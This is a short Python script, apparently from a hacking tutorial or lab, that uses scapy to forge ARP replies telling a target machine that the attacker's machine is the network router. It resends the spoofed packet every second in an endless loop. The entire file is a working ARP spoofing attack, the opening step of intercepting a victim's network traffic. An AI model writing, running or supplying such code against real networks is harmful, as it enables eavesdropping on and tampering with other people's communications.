#!/usr/bin/env python

import scapy.all as scapy
import time

# fool target into thinking "hacker machine" is the router
# source IP is set to source of router...
# the target will update its arp table - with the "hacker Machine" as its router
packet = scapy.ARP(op=2, pdst="10.20.14.204", hwdst="08:00:27:e6:e5:59", psrc="10.20.14.1") # source IP is set to source of router...
# print(packet.show())
# print(packet.summary())

while True:
    scapy.send(packet)
    time.sleep(1)